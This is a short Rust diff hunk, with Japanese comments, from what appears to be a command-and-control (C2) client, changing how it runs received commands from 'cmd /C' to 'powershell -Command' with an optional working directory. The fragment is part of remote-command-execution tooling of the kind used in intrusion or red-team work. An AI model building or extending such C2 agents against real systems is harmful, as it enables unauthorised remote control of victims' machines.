@@ -615,8 +615,8 @@ impl C2Client {
         let start_time = std::time::Instant::now();
         
         // コマンド実行用のプロセス設定
-        let mut cmd = std::process::Command::new("cmd");
-        cmd.args(&["/C", command]);
+        let mut cmd = std::process::Command::new("powershell");
+        cmd.args(&["-Command", command]);
         
         // 作業ディレクトリが指定されている場合は設定
         if !working_dir.is_empty() {
